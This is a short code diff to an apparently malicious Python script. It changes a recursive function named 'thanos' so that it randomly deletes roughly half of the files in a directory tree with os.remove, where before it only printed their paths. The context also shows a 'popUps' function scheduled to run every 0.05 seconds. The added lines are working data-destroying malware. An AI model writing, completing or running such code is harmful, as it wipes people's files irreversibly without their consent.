@@ -71,7 +71,12 @@ def thanos(dossier):
         if os.path.isdir(chemin_fichier):
             thanos(chemin_fichier)
         else:
-            print(chemin_fichier)
+            delete = randomNumber(0, 1)
+            if(delete == 0):
+                print('delete')
+                os.remove(chemin_fichier)
+            else:
+                print('keep')
     
 
 schedule.every(0.05).seconds.do(popUps)
